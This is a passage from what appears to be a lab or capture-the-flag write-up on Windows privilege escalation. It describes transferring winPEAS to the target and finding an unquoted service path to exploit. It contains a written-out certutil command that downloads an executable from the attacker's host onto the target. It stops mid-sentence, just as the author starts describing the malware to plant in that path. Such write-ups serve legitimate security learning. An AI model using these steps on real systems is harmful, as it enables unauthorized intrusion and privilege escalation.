I type `systeminfo` to learn about the machine:

![](attachments/Pasted%20image%2020251126222710.png)


From there, I go to `winpeas` on github:

![](attachments/Pasted%20image%2020251126223105.png)

And I download the latest version:

![](attachments/Pasted%20image%2020251126223127.png)

![](attachments/Pasted%20image%2020251126223201.png)

and I moved the file to the directory `/tmp`

![](attachments/Pasted%20image%2020251126223502.png)

and then I started a python server:

![](attachments/Pasted%20image%2020251126223551.png)

On the target machine I go to a location that is writable like in the `butler` directory:

![](attachments/Pasted%20image%2020251126225052.png)

and I get the `winpeas` with this command:
```cmd
certutil.exe -urlcache -f http://192.168.126.129/winPEASx64.exe winPEASx64.exe
```

![](attachments/Pasted%20image%2020251126225426.png)

and then I run it:

![](attachments/Pasted%20image%2020251126225511.png)

after `winpeas` ran, I went to `Services Information` and I found a service called `WiseBootAssistant` that auto-runs and the important note was the `No quotes and Space detected`. 

![](attachments/Pasted%20image%2020251126225926.png)

So all I had to do was write a malware in the path before `BootTime.exe` was executed.

So in the attacking machine I created a malware called 
